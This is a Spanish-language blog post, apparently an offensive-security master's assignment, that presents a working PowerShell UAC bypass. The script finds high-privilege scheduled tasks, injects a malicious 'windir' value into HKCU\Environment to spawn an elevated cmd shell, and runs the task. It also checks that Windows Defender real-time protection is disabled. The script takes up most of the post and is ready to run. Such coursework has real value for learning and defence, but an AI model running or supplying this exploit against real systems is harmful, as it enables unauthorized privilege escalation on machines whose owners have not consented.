---
layout: post
title: "M6 - ByPass UAC PS"
date: 2024-11-17 05:25:00 
categories:
    - posts
tags:
    - Master
    - PowerShell
    - UAC
---

## Enunciado de la tarea

En esta tarea se pide hacer un bypass de UAC creando para ello un código en Powershell. Se pide:

-  Utilizar la técnica Environment Injection basándose en el artículo de Tyranid’s Lair: https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html. Se debe automatizar las siguientes partes:

    Identificar la tarea programada que es débil a una inyección de variables de entorno
    Identificar el nombre de la variable de entorno que es débil
    Crear la clave de registro adecuada para cuando se invoque la tarea programada
    Ejecutar la tarea programada y verificar que realmente el bypass de UAC ha funcionado

- En el caso de que esta técnica ya no funcione, se puede utilizar otra técnica de UACMe (siempre que vuestro script sea hecho por vosotros, hay que explicarlo en la memoria de trabajo).

- [OPCIONAL] Este punto no es obligatorio en la práctica. Busca el uso de esta técnica en herramienta automáticas como Metasploit o Empire. Si no lo encuentras y quieres probar en un laboratorio propio puedes poner un ejemplo: a través de una Shell de tipo bind o reverse logra hacer bypass de UAC utilizando dicha técnica y consiguiendo una nueva sesión ya elevada.

## Enfoque

Al ser el primer script realizado en PS, veo prácticamente todo el curso de PS de Pablo y sobre todo la MasterClass. Tiempo apremia así que me lanzo a hacer el PoC de la inyección de variable de entorno, tras consultar con Pablo pruebo sin la protección del Defender en tiempo real y ahora si funciona. Me peleo bastante con el Script y una vez que funciona le agrego 2 funciones, 1. Hacer backup cada vez que se ejecuta el script en el Desktop, 2. Restauración de Registro.

## Script

\`\`\`powershell
# Función para hacer un backup de la clave de registro
function Backup-RegistryKey {
    $desktopPath = [Environment]::GetFolderPath("Desktop")
    $backupFile = Join-Path $desktopPath "Backup_$(Get-Date -Format 'yyyyMMddHHmmss').reg"
    reg export "HKCU\Environment" $backupFile
    Write-Host "Backup realizado en: $backupFile"
}

# Función para restaurar la clave de registro desde el backup
function Restore-RegistryKey {
    $backupFile = Read-Host "Introduce la ruta completa del archivo de backup"
    $backupFile = $backupFile.Trim() # Elimina espacios al principio y al final
    if (Test-Path $backupFile) {
        cmd /c "reg import `"$backupFile`"" 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Registro restaurado correctamente desde el archivo: $backupFile"
        } else {
            Write-Warning "Hubo un problema al restaurar el registro."
        }
    } else {
        Write-Warning "Archivo no encontrado: $backupFile"
    }
}

# Función para identificar tareas vulnerables e intentar el bypass
function UACBypass {
    Write-Host "Buscando tareas programadas vulnerables a inyección de variables de entorno..."
    $tasks = Get-ScheduledTask | 
        Where-Object { $_.Principal.RunLevel -ne "Limited" -and 
                       $_.Principal.LogonType -ne "ServiceAccount" -and 
                       $_.State -ne "Disabled" -and 
                       $_.Actions[0].CimClass.CimClassName -eq "MSFT_TaskExecAction" }

    if ($tasks.Count -eq 0) {
        Write-Warning "No se encontraron tareas vulnerables."
        return
    }

    # Mostrar las tareas vulnerables
    Write-Host "Tareas vulnerables a inyección de variables de entorno:"
    $tasks | Select-Object TaskName, TaskPath | Format-Table

    # Seleccionar la primera tarea vulnerable
    $taskName = $tasks[0].TaskName
    $taskPath = $tasks[0].TaskPath
    $fullTaskPath = "$taskPath$taskName"

    # Verificar si la tarea está configurada para ejecutarse con privilegios más altos
    $task = Get-ScheduledTask -TaskName $taskName
    if ($task.Principal.RunLevel -eq "Highest") {
        Write-Host "La tarea está configurada para ejecutarse con privilegios elevados."
    } else {
        Write-Host "La tarea no está configurada para ejecutarse con privilegios elevados."
    }

    # Inyectar la variable de entorno maliciosa
    reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f && REM "
    Write-Host "Variable de entorno maliciosa inyectada."

    # Ejecutar la tarea programada
    Write-Host "Ejecutando la tarea programada: $fullTaskPath"
    schtasks /Run /TN $fullTaskPath /I

    Write-Host "Si todo ha ido bien, deberías haber obtenido una shell elevada con privilegios de administrador."
}

# Menú principal
function Show-Menu {
    Write-Host "Opciones disponibles:"
    Write-Host "1. Restaurar Registro"
    Write-Host "2. Intentar Bypass de UAC"
    Write-Host "3. Salir"
}

# Script principal
function Main {
    # Comprobar Windows Defender
    if ((Get-MpPreference).DisableRealtimeMonitoring -eq $false) {
        Write-Warning "Windows Defender está habilitado en tiempo real. El bypass de UAC fallará."
        return
    }

    # Crear un backup inicial del registro
    Backup-RegistryKey

    # Mostrar menú al usuario
    while ($true) {
        Show-Menu
        $choice = Read-Host "Selecciona una opción (1/2/3)"
        switch ($choice) {
            "1" {
                Write-Host "Restaurar Registro:"
                Restore-RegistryKey
            }
            "2" {
                Write-Host "Intentando bypass de UAC..."
                UACBypass                
            }
            "3" {
                Write-Host "Saliendo del script."
                exit
            }
            default {
                Write-Warning "Opción no válida. Intenta de nuevo."
            }
        }
    }
}

# Ejecutar el script principal
Main
\`\`\`


## PoC

https://www.youtube.com/watch?v=OQbxniTdVw0


---

Máster en Seguridad Ofensiva (OSCP)

M6. ByPass UAC

Nicolás Damián Sadofschi | https://xargs.cat

"""

